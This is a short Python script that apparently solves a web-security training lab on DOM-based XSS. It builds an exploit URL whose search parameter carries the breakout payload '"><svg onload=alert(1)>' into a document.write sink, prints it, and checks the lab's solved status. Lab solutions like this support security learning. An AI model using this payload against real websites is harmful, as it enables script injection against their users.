import argparse
import requests

# DOM XSS in a document.write sink using source location.search. The page's own
# JavaScript reads the search query from location.search and passes it to
# document.write, placing it inside an <img src="..."> tag. Breaking out of that
# attribute/tag and injecting <svg onload=...> fires the alert.
#
# This is a DOM-based bug: the exploitation happens entirely in the browser, so
# Python can't trigger the alert itself. The script just prints the exploit URL
# and checks the lab status (which flips once the DOM XSS runs in a browser).

parser = argparse.ArgumentParser(description="Solve XSS lab 3 (DOM XSS, document.write sink, location.search source)")
parser.add_argument("lab_url", help="Lab URL (https://0a...web-security-academy.net)")
parser.add_argument("--payload", default='"><svg onload=alert(1)>',
                    help="Breakout payload placed in the search query")
args = parser.parse_args()

lab_url = args.lab_url.rstrip("/")

# the payload must ride in the URL because the source is location.search; the
# page's JS reads it client-side and writes it into the img context via document.write.
exploit_url = f"{lab_url}/?search={requests.utils.quote(args.payload)}"

print("[*] This is DOM-based XSS - the payload executes in the browser, not server-side.")
print("[*] Open this URL in a browser to trigger the alert:")
print(f"    {exploit_url}")

if "is-solved" in requests.get(lab_url + "/").text:
    print("[+] Lab solved!")
else:
    print("[!] Not marked solved yet - load the exploit URL above in a browser.")
